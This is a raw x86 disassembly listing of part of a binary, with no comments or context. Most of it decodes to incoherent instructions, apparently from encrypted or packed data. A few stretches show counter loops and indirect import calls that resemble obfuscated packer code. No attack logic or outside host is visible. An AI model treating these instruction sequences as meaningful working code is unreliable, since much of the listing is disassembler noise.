  408111:	ins    BYTE PTR es:[edi],dx
  408112:	stos   DWORD PTR es:[edi],eax
  408113:	pusha  
  408114:	push   0xb19d2100
  408119:	xchg   ebx,eax
  40811a:	push   edi
  40811b:	daa    
  40811c:	or     bh,BYTE PTR gs:[eax-0x4f616205]
  408123:	fadd   DWORD PTR [ebp-0x6c]
  408126:	cmp    al,0xf0
  408128:	adc    eax,0x871dfb42
  40812d:	sub    eax,0xc54984c0
  408132:	push   ebp
  408133:	inc    esi
  408134:	mov    BYTE PTR [ebp+0x52],al
  408137:	scas   eax,DWORD PTR es:[edi]
  408138:	loop   0x408113
  40813a:	fs dec esi
  40813c:	add    dl,ch
  40813e:	sbb    bh,dh
  408140:	xchg   BYTE PTR [esi],bh
  408142:	adc    edx,ecx
  408144:	loop   0x40812a
  408146:	js     0x40819c
  408148:	mov    ebp,0x41dd2cad
  40814d:	sti    
  40814e:	mov    cl,0xdb
  408150:	pop    edx
  408151:	loopne 0x4080d3
  408153:	pop    esi
  408154:	sbb    DWORD PTR [edx],0xf7c19f4
  40815a:	lahf   
  40815b:	fs push edi
  40815d:	hlt    
  40815e:	jne    0x40817f
  408160:	jmp    0xc25c:0x6a343008
  408167:	adc    al,dh
  408169:	sub    ebx,DWORD PTR [esi+eiz*4-0x57779a95]
  408170:	mov    esp,0x4447230d
  408175:	cmp    esi,DWORD PTR [eax]
  408177:	das    
  408178:	fwait
  408179:	pop    ebx
  40817a:	push   cs
  40817b:	cmp    al,0x7
  40817d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40817e:	jecxz  0x4081f0
  408180:	div    esi
  408182:	sbb    al,0x50
  408184:	dec    esi
  408185:	sub    ebp,DWORD PTR ds:0x9a6e
  40818a:	imul   edi,DWORD PTR [ebx],0x314d112a
  408190:	mul    dh
  408192:	sar    BYTE PTR [ecx+0x2ca3f1e6],1
  408198:	jmp    0xc932bb1c
  40819d:	adc    bl,0x51
  4081a0:	pop    ss
  4081a1:	das    
  4081a2:	xchg   esi,eax
  4081a3:	cmp    bh,0x55
  4081a6:	adc    al,0xac
  4081a8:	shr    esi,cl
  4081aa:	sar    DWORD PTR [ebp+0x515fcd7d],1
  4081b0:	jb     0x4081f6
  4081b2:	pop    ebp
  4081b3:	pop    esp
  4081b4:	xchg   esi,eax
  4081b5:	fs scas eax,DWORD PTR es:[edi]
  4081b7:	mov    cl,0x8a
  4081b9:	sub    esp,DWORD PTR [ecx-0x16a22c14]
  4081bf:	add    eax,0x98c69db3
  4081c4:	lea    eax,es:[eax+0x7b]
  4081c8:	xchg   edx,eax
  4081c9:	in     al,dx
  4081ca:	pop    eax
  4081cb:	(bad)  
  4081cc:	xlat   BYTE PTR ds:[ebx]
  4081cd:	icebp  
  4081ce:	pop    es
  4081cf:	dec    eax
  4081d1:	(bad)  
  4081d3:	test   BYTE PTR [edi],0xef
  4081d6:	das    
  4081d7:	cli    
  4081d8:	add    BYTE PTR [edx+edx*8],ch
  4081db:	xor    eax,0xad8d5e53
  4081e0:	sub    eax,0x6c44a538
  4081e5:	sub    DWORD PTR [edx+0x7c],ebx
  4081e8:	cmp    eax,0xb5254662
  4081ed:	lock xor BYTE PTR [eax],0x1e
  4081f1:	icebp  
  4081f2:	aam    0x40
  4081f4:	push   esp
  4081f6:	xor    esp,0xffffffb3
  4081f9:	(bad)
  4081fc:	pusha  
  4081fd:	sar    BYTE PTR [ecx],0x40
  408200:	inc    edx
  408201:	(bad)  
  408202:	push   ss
  408203:	mov    esp,0xc4f05eef
  408208:	add    DWORD PTR [ecx-0x44],edi
  40820b:	xor    DWORD PTR [esi-0x19c9b0d3],ebx
  408211:	mov    al,0xcd
  408213:	push   ebp
  408214:	fldenv ds:0xe916caed
  40821a:	emms   
  40821c:	fild   WORD PTR [esi+0x62]
  40821f:	dec    ecx
  408220:	nop
  408221:	adc    ah,ch
  408223:	dec    ecx
  408224:	xchg   ebx,eax
  408225:	xor    BYTE PTR [edx],dh
  408227:	mov    ds:0xf679e6fa,eax
  40822c:	gs mov ebp,0x656e56e4
  408232:	sahf   
  408233:	mov    al,bh
  408235:	test   DWORD PTR [edx-0x16],ebx
  408238:	lahf   
  408239:	repz test BYTE PTR [ebx-0x63],0xd0
  40823e:	sbb    ecx,DWORD PTR [esi]
  408240:	fiadd  WORD PTR [eax-0x26088c50]
  408246:	scas   al,BYTE PTR es:[edi]
  408247:	jg     0x408223
  408249:	mov    DWORD PTR [ebx-0x47],ecx
  40824c:	push   cs
  40824d:	bts    DWORD PTR [esi],0xa
  408251:	pop    ebx
  408252:	repz dec edx
  408254:	cmp    bh,0x95
  408257:	aad    0xe6
  408259:	shl    cl,0xc8
  40825c:	xor    al,0x18
  40825e:	push   edi
  40825f:	repz add ebp,0x22cccfb8
  408266:	cdq    
  408267:	cdq    
  408268:	out    dx,eax
  408269:	pop    edi
  40826a:	in     eax,0xf7
  40826c:	out    dx,eax
  40826d:	mov    WORD PTR [esi+ecx*1-0x1e9d264],ss
  408274:	mov    edi,0xad1b127a
  408279:	fiadd  DWORD PTR [eax+0x42]
  40827c:	push   esi
  40827d:	dec    edi
  40827e:	jecxz  0x40823b
  408280:	cwde   
  408281:	out    dx,al
  408282:	jbe    0x408295
  408284:	aam    0xee
  408286:	mov    ds:0x820159d1,al
  40828b:	jae    0x408249
  40828d:	dec    eax
  40828e:	or     bh,BYTE PTR [eax+ebp*8]
  408291:	jecxz  0x4082ec
  408293:	jae    0x408267
  408295:	aam    0xdd
  408297:	(bad)  
  408298:	jne    0x4082b0
  40829a:	int    0xe8
  40829c:	xor    BYTE PTR [ebp+esi*1-0x4f22ff91],0xc3
  4082a4:	jbe    0x40828c
  4082a6:	arpl   dx,sp
  4082a8:	push   edx
  4082a9:	cmp    edi,DWORD PTR [eax-0x5b]
  4082ac:	jl     0x408297
  4082ae:	adc    DWORD PTR [edi+0x7dd65981],0x7f3af734
  4082b8:	imul   edi,DWORD PTR [edi-0x13],0x731c23e3
  4082bf:	nop
  4082c0:	leave  
  4082c1:	push   eax
  4082c2:	in     eax,0x4
  4082c4:	inc    ebp
  4082c5:	jo     0x408285
  4082c7:	jle    0x40833d
  4082c9:	rcr    BYTE PTR [ebp*2+0x308732b3],cl
  4082d0:	mov    ds:0x2625659b,eax
  4082d5:	mov    dl,0xea
  4082d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082d8:	and    esp,DWORD PTR [edi]
  4082da:	add    ecx,DWORD PTR [edi-0x22]
  4082dd:	add    eax,0xa17741d5
  4082e2:	mov    WORD PTR [ebp-0x3e],es
  4082e5:	cwde   
  4082e6:	or     esp,esp
  4082e8:	fdivr  DWORD PTR [ebp+0x78]
  4082eb:	mov    edx,0xa622431c
  4082f1:	ja     0x4082bf
  4082f3:	dec    ecx
  4082f4:	call   0x353a:0xd4ad2ccd
  4082fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082fc:	dec    edi
  4082fd:	je     0x4082c2
  4082ff:	repz or al,0x21
  408302:	inc    esp
  408303:	shl    DWORD PTR [edi+0xf],1
  408306:	push   0xffffffa1
  408308:	xor    eax,0xb359ee87
  40830d:	jb     0x40834e
  40830f:	xchg   esp,eax
  408310:	xchg   ecx,eax
  408311:	xor    cl,BYTE PTR [ebp+0x7d754250]
  408317:	push   ebx
  408318:	xchg   esi,eax
  408319:	or     al,0x13
  40831b:	adc    al,0xe1
  40831d:	mov    dl,0x1d
  40831f:	lahf   
  408320:	push   cs
  408321:	dec    eax
  408322:	cs je  0x408308
  408325:	pop    esi
  408326:	fldcw  WORD PTR [edi-0x3b03bef4]
  40832c:	sub    eax,0x69238e9
  408331:	mov    edx,edi
  408333:	add    eax,0x1f78b172
  408338:	sub    dl,al
  40833a:	cmc    
  40833b:	mov    ch,0xba
  40833d:	(bad)  
  40833e:	jnp    0x408372
  408340:	and    ebx,edi
  408342:	fild   QWORD PTR [edi-0x27e8ee51]
  408348:	outs   dx,BYTE PTR ds:[esi]
  408349:	jno    0x40838b
  40834b:	jge    0x4082dc
  40834d:	sahf   
  40834e:	push   es
  40834f:	jecxz  0x40832a
  408351:	loopne 0x40833c
  408353:	jecxz  0x408388
  408355:	ret    0x323d
  408358:	or     ecx,edx
  40835a:	imul   ecx,DWORD PTR [edi],0xffef7e84
  408360:	dec    DWORD PTR [ebx+0x81f045]
  408366:	add    al,0x35
  408368:	inc    eax
  408369:	pop    es
  40836a:	jmp    0x4072df
  40836f:	mov    eax,DWORD PTR [ebp-0x1c]
  408372:	cmp    DWORD PTR [eax],edi
  408374:	je     0x4072df
  40837a:	mov    eax,0x800f1c81
  40837f:	jmp    0x4072e6
  408384:	push   ebp
  408385:	mov    ebp,esp
  408387:	sub    esp,0x60
  40838a:	mov    DWORD PTR ds:0x43466f,0x17
  408394:	cmp    DWORD PTR ds:0x43466f,0x0
  40839b:	je     0x4083fd
  4083a1:	cmp    DWORD PTR ds:0x43466f,0x6
  4083a8:	jne    0x4083c8
  4083ae:	push   0x4346d3
  4083b3:	push   0x4c23
  4083b8:	push   0x3f32
  4083bd:	push   0x4c42
  4083c2:	call   DWORD PTR ds:0x413288
  4083c8:	cmp    DWORD PTR ds:0x43466f,0x7
  4083cf:	jne    0x4083e0
  4083d5:	mov    eax,ds:0x43466f
  4083da:	dec    eax
  4083db:	mov    ds:0x43466f,eax
  4083e0:	mov    eax,ds:0x43466f
  4083e5:	dec    eax
  4083e6:	mov    ds:0x43466f,eax
  4083eb:	jmp    0x408394
  4083f0:	movzx  eax,BYTE PTR ds:0x434793
  4083f7:	sbb    DWORD PTR ds:0x434683,eax
  4083fd:	mov    eax,DWORD PTR [ebp+0x8]
  408400:	sbb    DWORD PTR ds:0x434707,0x4487
  40840a:	push   ebx
  40840b:	xor    ebx,ebx
  40840d:	or     ebx,DWORD PTR ds:0x434703
  408413:	sbb    DWORD PTR ds:0x434793,ebx
  408419:	push   esi
  40841a:	jmp    0x4086a2
  40841f:	jmp    DWORD PTR [ecx]
  408421:	lahf   
  408422:	xchg   esp,eax
  408423:	mov    eax,ds:0xe73db59c
  408428:	sbb    bh,bl
  40842a:	(bad)  
  40842b:	sbb    DWORD PTR [ebx+edx*1+0x7edefbc2],edx
  408432:	jle    0x408415
  408434:	js     0x4084b4
  408436:	jle    0x4083bc
  408438:	(bad)  
  408439:	mov    al,0x50
  40843b:	adc    ebp,DWORD PTR ds:[esi+ebp*2]
  40843f:	jp     0x408448
  408441:	ds sahf 
  408443:	rcr    DWORD PTR [esi*2+0x7982c35c],1
  40844a:	xchg   ebp,eax
  40844b:	sub    ch,BYTE PTR [ebx+0x61]
  40844e:	push   esp
  40844f:	(bad)  
  408450:	jl     0x4084bd
  408452:	in     eax,dx
  408453:	sub    dh,BYTE PTR [ecx+0x23]
  408456:	idiv   DWORD PTR [esi]
  408458:	vmwrite edi,ebx
  40845b:	add    bh,BYTE PTR [esp+esi*2+0x77]
  40845f:	outs   dx,BYTE PTR ds:[esi]
  408460:	sbb    eax,0x5bb68150
  408465:	jmp    0xb9a756bb
  40846a:	ret    0x3bbc
  40846d:	fdivr  st,st(3)
  40846f:	out    0xe0,al
  408471:	dec    esp
  408472:	pop    ebx
  408473:	pop    ss
  408474:	and    al,0x8e
  408476:	dec    edx
  408477:	scas   eax,DWORD PTR es:[edi]
  408478:	pop    ebx
  408479:	add    eax,0x6f66ea15
  40847e:	mov    ch,0xb
  408480:	ja     0x408414
  408482:	cmp    BYTE PTR [ebx+0x63c7490c],0x4a
  408489:	int3   
  40848a:	lods   eax,DWORD PTR ds:[esi]
  40848b:	outs   dx,BYTE PTR cs:[esi]
  40848d:	outs   dx,BYTE PTR ds:[esi]
  40848e:	(bad)  
  40848f:	out    dx,al
  408490:	nop
  408491:	pop    eax
  408492:	cld    
  408493:	loop   0x408441
  408495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408496:	xchg   ebx,eax
  408497:	xor    DWORD PTR [edx-0x6c],0x4516023f
  40849e:	or     al,0x8b
  4084a0:	adc    eax,0xf8561e0f
  4084a5:	jmp    0x3800:0x5489b6c1
  4084ac:	fstp   TBYTE PTR [edi+0x22]
  4084af:	mov    dl,0x86
  4084b1:	pop    ss
  4084b2:	clc    
  4084b3:	or     BYTE PTR [esi],cl
  4084b5:	mov    BYTE PTR [edx],dh
  4084b7:	mov    ebp,0x276c9b99
  4084bc:	and    esp,esi
  4084be:	and    al,0xd5
  4084c0:	in     eax,0x4f
  4084c2:	pusha  
  4084c3:	sub    eax,0x71f06d8e
  4084c8:	(bad)  
  4084c9:	int3   
  4084ca:	cs push eax
  4084cc:	cmp    dh,ah
  4084ce:	btr    DWORD PTR [esi+0x18],0xae
  4084d3:	outs   dx,BYTE PTR ds:[esi]
  4084d4:	mov    ds:0xa8ac5eb4,eax
  4084d9:	cmp    BYTE PTR [eax*2+0x4727e9cf],cl
  4084e0:	call   0xf81e:0xe94e1800
  4084e7:	and    al,0x56
  4084e9:	call   0x2ee1:0x4c15e767
  4084f0:	mov    edi,0xc850d279
  4084f5:	and    esp,esp
  4084f7:	xor    esp,esp
  4084f9:	lods   al,BYTE PTR ds:[esi]
  4084fa:	push   ss
  4084fb:	loopne 0x408548
  4084fd:	(bad)  
  4084fe:	(bad)  
  4084ff:	out    0x11,eax
  408501:	rol    BYTE PTR [ebx],cl
  408503:	hlt    
  408504:	inc    esi
  408505:	xchg   esi,eax
  408506:	dec    esi
  408507:	mov    es,WORD PTR [ecx+eax*8-0x28]
  40850b:	popa   
  40850c:	mov    BYTE PTR [esp+eax*2-0x4a],cl
  408510:	popf   
  408511:	rcl    BYTE PTR [esi-0x18],0xd6
  408515:	push   esi
  408516:	stc    
  408517:	dec    ebp
  408518:	add    BYTE PTR [edi+0x40],al
  40851b:	jp     0x4084b4
  40851d:	mov    ah,0x50
  40851f:	pushf  
  408520:	push   es
  408521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408522:	inc    ecx
  408523:	or     eax,DWORD PTR [ecx-0x66]
  408526:	outs   dx,BYTE PTR ds:[esi]
  408527:	stc    
  408528:	rol    DWORD PTR [edi+0x48],cl
  40852b:	callw  0x150d
  40852f:	xor    dh,bl
  408531:	xchg   edx,eax
  408532:	and    edx,ecx
  408534:	pop    es
  408535:	adc    DWORD PTR [eax-0x34],ebx
  408538:	mov    ecx,0x47a8d543
  40853d:	mov    ecx,DWORD PTR [eax]
  40853f:	lds    esp,FWORD PTR [ebp+0x5dca17b8]
  408545:	sub    ebp,0x3dc0b26e
  40854b:	std    
  40854c:	cmp    al,BYTE PTR [ebp+0x2fafbcb7]
  408552:	mov    ds:0x5b58cf8e,eax
  408557:	or     BYTE PTR [ecx],al
  408559:	xchg   edx,eax
  40855a:	mov    fs,ecx
  40855c:	cmp    edi,esp
  40855e:	gs cdq 
  408560:	xor    ecx,DWORD PTR [ebp-0x80]
  408563:	xor    al,0xe4
  408565:	ja     0x408520
  408567:	push   ss
  408568:	pop    ecx
  408569:	dec    edi
  40856a:	loope  0x4085a1
  40856c:	xchg   ecx,eax
  40856d:	cmp    eax,0x7a0fd589
  408572:	dec    ebx
  408573:	adc    ecx,esi
  408575:	pop    edi
  408576:	icebp  
  408577:	cld    
  408578:	or     BYTE PTR [ecx+esi*2-0x73fd150a],dh
  40857f:	jg     0x4085e8
  408581:	jbe    0x40850d
  408583:	(bad)  
  408584:	xchg   ebx,eax
  408585:	sub    bl,bl
  408587:	adc    dh,bh
  408589:	cli    
  40858a:	push   ds
  40858b:	ficomp WORD PTR [eax-0x2f]
  40858e:	xchg   esi,eax
  40858f:	fstp   TBYTE PTR [ecx]
  408591:	cmc    
  408592:	lahf   
  408593:	mov    bl,0xcf
  408595:	sbb    eax,0x57403916
  40859a:	push   cs
  40859b:	add    al,0xe2
  40859d:	jne    0x408592
  40859f:	jle    0x408554
  4085a1:	out    dx,al
  4085a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085a3:	les    esp,FWORD PTR [ebp+0x46]
  4085a6:	pop    ebx
  4085a7:	popf   
  4085a8:	fwait
  4085a9:	lahf   
  4085aa:	add    BYTE PTR [ebp-0x18e88ff4],0x27
  4085b1:	inc    ecx
  4085b2:	(bad)  
  4085b3:	repz push esp
  4085b5:	pop    eax
  4085b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085b7:	mov    bh,0x59
  4085b9:	lods   al,BYTE PTR ds:[esi]
  4085ba:	push   esi
  4085bb:	mov    eax,ds:0x31e7bb9f
  4085c0:	out    dx,al
  4085c1:	stos   BYTE PTR es:[edi],al
  4085c2:	fisubr WORD PTR [eax+esi*1-0x5210e321]
  4085c9:	daa    
  4085ca:	or     al,0x1d
  4085cc:	add    al,0x5f
  4085ce:	mov    BYTE PTR [esi-0x19],ah
  4085d1:	jge    0x40857f
  4085d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085d4:	push   eax
  4085d5:	cli    
  4085d6:	(bad)  
  4085d7:	push   esi
  4085d8:	and    cl,BYTE PTR [eax]
  4085da:	add    eax,0xd09cfc96
  4085df:	sub    al,0x8d
  4085e1:	dec    ebp
  4085e2:	mov    DWORD PTR [edx+0x4b],edx
  4085e5:	adc    BYTE PTR [edi+0x61],0xeb
  4085e9:	test   eax,0xd1895755
  4085ee:	div    DWORD PTR [esp-0x210dc250]
  4085f5:	aaa    
  4085f6:	hlt    
  4085f7:	mov    cl,0x78
  4085f9:	xor    edx,esp
  4085fb:	jle    0x4085ca
  4085fd:	push   ebp
  4085fe:	dec    esp
  4085ff:	pop    esp
  408600:	es and eax,0x59d000d0
  408606:	das    
  408607:	gs in  eax,0x0
  40860a:	es leave 
  40860c:	mov    cl,0xa8
  40860e:	mov    edx,esp
  408610:	xor    ebx,esi
  408612:	popf   
  408613:	popf   
  408614:	retf   
  408615:	clc    
  408616:	mov    ds:0x22082e59,al
  40861b:	lods   eax,DWORD PTR ds:[esi]
  40861c:	lock cmp esp,DWORD PTR [ebp-0x52281819]
  408623:	mov    ah,0x55
  408625:	mov    cl,0x50
  408627:	ret    
  408628:	out    dx,al
  408629:	in     eax,dx
  40862a:	mov    dl,0x3f
  40862c:	test   eax,0xbeb24b23
  408631:	add    DWORD PTR [eax],ebp
  408633:	add    al,0xc4
  408635:	jbe    0x40863c
  408637:	popa   
  408638:	fld    QWORD PTR [ecx-0x7e]
  40863b:	in     al,dx
  40863c:	mov    ebp,0x77897eea
  408641:	leave  
  408642:	pop    edx
  408643:	xchg   edi,eax
  408644:	lea    edx,[edi-0x78d18e83]
  40864a:	pop    ebp
  40864b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40864c:	xor    al,0x5b
  40864e:	adc    eax,0x295e4a79
  408653:	lea    esp,[edx+0x5c]
  408656:	mov    cl,0xd3
  408658:	aas    
  408659:	mov    al,BYTE PTR [ebp+0x24]
  40865c:	sbb    eax,0xa795dba5
  408661:	add    dl,BYTE PTR ds:0xb2ba71f8
  408667:	push   ss
  408668:	sbb    edx,edx
  40866a:	cmp    ecx,ebp
  40866c:	pusha  
  40866d:	ins    BYTE PTR es:[edi],dx
  40866e:	ret    
  40866f:	push   ds
  408670:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408671:	ret    0x14ef
  408674:	mov    ds:0xa5e68632,al
  408679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40867a:	inc    esi
  40867b:	dec    ebp
  40867c:	xor    DWORD PTR [ebp+0x6f657a60],ecx
  408682:	repz dec esi
  408684:	loop   0x4086a9
  408686:	adc    dh,BYTE PTR [edx]
  408688:	or     edx,DWORD PTR [ebx-0x161df5a5]
  40868e:	add    DWORD PTR ds:0x9bb6d0f7,edi
  408694:	cmp    bh,BYTE PTR [ebp-0x51]
  408697:	pop    ebp
  408698:	xor    BYTE PTR [esi+0x497377ef],dl
  40869e:	fwait
  40869f:	sub    ch,bh
  4086a1:	mov    ah,0xbe
  4086a3:	push   ecx
  4086a4:	or     BYTE PTR [ecx+0x7],dl
  4086a7:	and    DWORD PTR ds:0x43466f,0x0
  4086b1:	mov    ebx,DWORD PTR ds:0x43466f
  4086b7:	inc    ebx
  4086b8:	mov    DWORD PTR ds:0x43466f,ebx
  4086be:	cmp    DWORD PTR ds:0x43466f,0x8
  4086c5:	jne    0x4086d6
  4086cb:	push   0x2214
  4086d0:	call   DWORD PTR ds:0x41328c
  4086d6:	cmp    DWORD PTR ds:0x43466f,0x7
  4086dd:	jne    0x4086f2
  4086e3:	xor    ebx,ebx
  4086e5:	or     ebx,DWORD PTR ds:0x43466f
  4086eb:	inc    ebx
  4086ec:	mov    DWORD PTR ds:0x43466f,ebx
  4086f2:	cmp    DWORD PTR ds:0x43466f,0x11
  4086f9:	jb     0x4086b1
  4086ff:	xor    eax,esi
  408701:	or     ebx,0x4275
  408707:	mov    ebx,0x327299
  40870c:	add    eax,ebx
  40870e:	push   edi
  40870f:	sub    edi,DWORD PTR ds:0x434703
  408715:	mov    DWORD PTR [ebp-0x18],eax
  408718:	xor    edi,0x561f
  40871e:	jmp    0x4089a6
  408723:	push   esi
  408724:	ja     0x40875d
  408726:	push   ecx
  408727:	aaa    
  408728:	push   ecx
  408729:	jo     0x40879c
  40872b:	(bad)  
  40872c:	mov    eax,0x50b73fc8
  408731:	or     esp,ebx
  408733:	outs   dx,BYTE PTR ds:[esi]
  408734:	fdivr  DWORD PTR [esi+0x7e]
  408737:	loope  0x4087b1
  408739:	jle    0x4087b9
  40873b:	mov    esi,DWORD PTR [edx-0x69]
  40873e:	xchg   edi,eax
  40873f:	popa   
  408740:	jns    0x408752
  408742:	and    al,0x41
  408744:	in     eax,dx
  408745:	fidiv  WORD PTR [eax]
  408747:	das    
  408748:	adc    ah,ah
  40874a:	dec    ecx
  40874b:	push   cs
  40874c:	faddp  st(5),st
  40874e:	fimul  WORD PTR [esi-0x7fa0306]
  408754:	pop    edi
  408755:	lock cmp edx,esi
  408758:	ret    0xd6c1
  40875b:	sbb    BYTE PTR [ebx+0x17070e0],dl
  408761:	inc    eax
  408762:	jne    0x40875b
  408764:	pushf  
  408765:	xchg   esi,eax
  408766:	stos   DWORD PTR es:[edi],eax
  408767:	inc    ecx
  408768:	push   cs
  408769:	pop    DWORD PTR [esi]
  40876b:	ficomp DWORD PTR [esi+eiz*4-0x40]
  40876f:	cmp    DWORD PTR [eax-0x59],0xffffffcf
  408773:	sahf   
  408774:	lods   eax,DWORD PTR ds:[esi]
  408775:	xchg   ebp,eax
  408776:	jb     0x4087be
  408778:	pop    esi
  408779:	inc    ebp
  40877a:	xchg   DWORD PTR ds:0x1d60a769,esi
  408780:	xor    eax,0xc2944374
  408785:	jns    0x408721
  408787:	test   cl,0xc1
  40878a:	sub    ebx,DWORD PTR [edi-0x197b83bc]
  408790:	add    ebp,DWORD PTR [ebp-0x4]
  408793:	jnp    0x4087f0
  408795:	(bad)  
  408796:	stos   BYTE PTR es:[edi],al
  408797:	pop    eax
  408798:	ret    
  408799:	add    al,0x61
  40879b:	adc    ebp,edx
  40879d:	cmp    BYTE PTR [edi+0xc],dl
  4087a0:	shl    BYTE PTR [edx+0x17],cl
  4087a3:	add    al,bl
  4087a5:	mov    ecx,0xe882c74f
  4087aa:	add    DWORD PTR [ecx],0x4f
  4087ad:	or     BYTE PTR [edi],dl
  4087af:	xlat   BYTE PTR ds:[ebx]
  4087b0:	mov    ebp,ecx
  4087b2:	add    al,0xb7
  4087b4:	jnp    0x40877a
  4087b6:	(bad)  
  4087b7:	retf   0x27ea
  4087ba:	pop    esp
  4087bb:	jp     0x40883b
  4087bd:	pop    esp
  4087be:	ss enter 0x4406,0x18
  4087c3:	lahf   
  4087c4:	dec    ecx
  4087c5:	xchg   edi,eax
  4087c6:	or     al,0xa5
  4087c8:	stos   BYTE PTR es:[edi],al
  4087c9:	xor    DWORD PTR [edx],ecx
  4087cb:	or     DWORD PTR [eax+0x9],edx
  4087ce:	dec    ebp
  4087cf:	mov    bl,0xba
  4087d1:	mov    ecx,0x8dbd0215
  4087d6:	fwait
  4087d7:	lahf   
  4087d8:	push   0xfdca97d1
  4087dd:	ret    0xf44d
  4087e0:	dec    edi
  4087e1:	jns    0x40876e
  4087e3:	test   al,0x44
  4087e5:	repz push esp
  4087e7:	xor    eax,0xf750691
  4087ec:	lock jg 0x408857
  4087ef:	fwait
  4087f0:	aad    0x5a
  4087f2:	xor    al,0x96
  4087f4:	scas   eax,DWORD PTR es:[edi]
  4087f5:	and    ah,bh
  4087f7:	pop    ebp
  4087f8:	and    al,dh
  4087fa:	push   edi
  4087fb:	cmp    ebx,ebp
  4087fd:	out    0xe4,al
  4087ff:	enter  0x568f,0x32
  408803:	popa   
  408804:	jmp    0x85378b71
  408809:	mov    esi,0xb4529341
  40880e:	pop    es
  40880f:	jae    0x408859
  408811:	push   eax
  408812:	jmp    0x3ac5:0xb3f20098
  408819:	call   0x6b01ed55
  40881e:	cmp    eax,0x33d9c4c
  408823:	pop    eax
  408824:	inc    ebp
  408825:	loope  0x40880e
  408827:	mov    bl,0x86
  408829:	adc    ecx,DWORD PTR [edi-0x61]
  40882c:	jle    0x408803
  40882e:	cs mul eax
  408831:	pop    ebx
  408832:	adc    bh,BYTE PTR [edi]
  408834:	adc    ch,dl
  408836:	jne    0x408849
  408838:	xor    DWORD PTR [edi+0x6771db74],ebx
  40883e:	push   0xd8c0b621
  408843:	(bad)  
  408845:	pop    ds
  408846:	call   0xd605d03
  40884b:	sub    al,0x92
  40884d:	mov    cl,0x86
  40884f:	push   ds
  408850:	int3   
  408851:	(bad)  
  408852:	jg     0x4087d7
  408854:	outs   dx,BYTE PTR ds:[esi]
  408855:	cmp    dl,ah
  408857:	adc    DWORD PTR [esi+0xe],ecx
  40885a:	xchg   ecx,eax
  40885b:	in     eax,dx
  40885c:	cmp    DWORD PTR [ecx],esp
  40885e:	std    
  40885f:	lds    esp,FWORD PTR es:[ecx+ebx*4]
  408863:	ss loopne 0x4088a3
  408866:	setg   BYTE PTR [edx+0x7832deaf]
  40886d:	lahf   
  40886e:	cmp    al,0x7f
  408870:	sub    BYTE PTR [ecx-0x592e5c13],al
  408876:	pop    ecx
  408877:	addr16 pop es
  408879:	adc    eax,0x38332906
  40887e:	mov    eax,0xfbd86849
  408883:	dec    esi
  408884:	rcr    BYTE PTR [edi-0xa],1
  408887:	shl    DWORD PTR [esi+0x7979b350],1
  40888d:	push   ebx
  40888e:	(bad)  
  40888f:	hlt    
  408890:	xchg   ebp,eax
  408891:	add    DWORD PTR ds:0xbc5bd567,edi
  408897:	sub    eax,0x9daaa8cc
  40889c:	test   BYTE PTR [edi-0x76ab645c],ah
  4088a2:	push   edi
  4088a3:	scas   eax,DWORD PTR es:[edi]
  4088a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088a5:	xchg   DWORD PTR [edi+0x43f3be1b],ebp
  4088ab:	xor    eax,0x5e9c168b
  4088b0:	mov    bl,0x77
  4088b2:	mov    ds:0x336a4696,eax
  4088b8:	push   cs
  4088b9:	das    
  4088ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088bc:	shl    BYTE PTR [edi-0x3b],0xd8
  4088c0:	and    BYTE PTR [esi-0x3221fe98],bh
  4088c6:	adc    eax,0x3e377f15
  4088cb:	fild   QWORD PTR [ebx-0x7d]
  4088ce:	lea    ebp,[ebp+0x4ac9c8c7]
  4088d4:	(bad)
  4088d7:	or     DWORD PTR [esi+esi*1-0xc69d242],ebx
  4088de:	sbb    al,0x88
  4088e0:	and    BYTE PTR [esi],dl
  4088e2:	pop    edi
  4088e3:	cmp    esi,DWORD PTR [esi-0xe]
  4088e6:	or     al,0x76
  4088e8:	sbb    al,0x88
  4088ea:	mov    WORD PTR [ebp+0x7c],?
  4088ed:	loopne 0x408949
  4088ef:	mov    al,0x37
  4088f1:	fild   WORD PTR [ebx-0x44f64e14]
  4088f7:	sub    BYTE PTR [edi+0x15c54186],dl
  4088fd:	mov    ebp,0x64d02aa0
  408902:	mov    al,0xfb
  408904:	push   es
  408905:	jo     0x408950
  408907:	js     0x408956
  408909:	dec    eax
  40890a:	mov    eax,ds:0x175adf59
  40890f:	push   esi
  408910:	jae    0x408904
  408912:	jno    0x4088f3
  408914:	jl     0x408938
  408916:	sub    BYTE PTR [ebx],ch
  408918:	xchg   esi,eax
  408919:	pop    ds
  40891a:	jge    0x408957
  40891c:	not    BYTE PTR [ecx-0x7e]
  40891f:	mov    al,0x79
  408921:	neg    BYTE PTR [edi-0x69]
  408924:	outs   dx,BYTE PTR ds:[esi]
  408925:	popa   
  408926:	es dec edi
  408928:	stos   BYTE PTR es:[edi],al
  408929:	adc    eax,0x3b7b8c80
  40892e:	push   eax
  40892f:	ret    
  408930:	jmp    0xa970:0x942adf2d
  408937:	add    DWORD PTR [edx+0x7b],ecx
  40893a:	xor    al,0x3f
  40893c:	enter  0x883c,0x84
  408940:	adc    edi,DWORD PTR [edi]
  408942:	sbb    DWORD PTR [esi+0x7e],edx
  408945:	shl    DWORD PTR [edi+esi*8+0x79],0x36
  40894a:	jp     0x408999
  40894c:	call   0x7e3a:0x9effeb44
  408953:	pop    ebx
  408954:	dec    esp
  408955:	and    DWORD PTR [ebp+0x3ab4987e],edx
  40895b:	jl     0x408948
  40895d:	xchg   esp,eax
  40895e:	mul    BYTE PTR [edx-0x2fddd35e]
  408964:	push   eax
  408965:	cwde   
  408966:	out    dx,eax
  408967:	jbe    0x4089a3
  408969:	mov    DWORD PTR [ebx],edx
  40896b:	sub    dh,BYTE PTR [ebx]
  40896d:	jne    0x4089e3
  40896f:	mov    al,ds:0x9db075c0
  408974:	sub    bh,BYTE PTR [ebx-0x386deb47]
